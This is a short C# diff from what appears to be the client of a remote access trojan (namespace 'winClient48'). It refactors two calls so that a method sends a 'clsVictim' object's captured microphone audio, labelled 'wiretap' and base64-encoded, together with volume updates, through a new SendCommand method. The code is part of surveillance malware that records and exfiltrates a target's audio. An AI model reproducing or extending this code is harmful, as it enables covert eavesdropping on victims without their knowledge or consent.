@@ -340,7 +340,7 @@ namespace winClient48
 
         public void SendBuffer(clsVictim v, string type, byte[] buffer, int bytes_recorded)
         {
-            v.encSend(2, 0, $"audio|wiretap|{type}|buffer|{Bytes_dB(buffer, bytes_recorded)}|" + Convert.ToBase64String(buffer));
+            v.SendCommand($"audio|wiretap|{type}|buffer|{Bytes_dB(buffer, bytes_recorded)}|" + Convert.ToBase64String(buffer));
 
             if (type == "micro" && g_bMicRecord)
             {
@@ -359,7 +359,7 @@ namespace winClient48
 
             last_update = DateTime.Now;
             vol = vol > 100.0f ? 100.0f : vol;
-            v.encSend(2, 0, "audio|update|vol|" + vol);
+            v.SendCommand("audio|update|vol|" + vol);
         }
     }
 
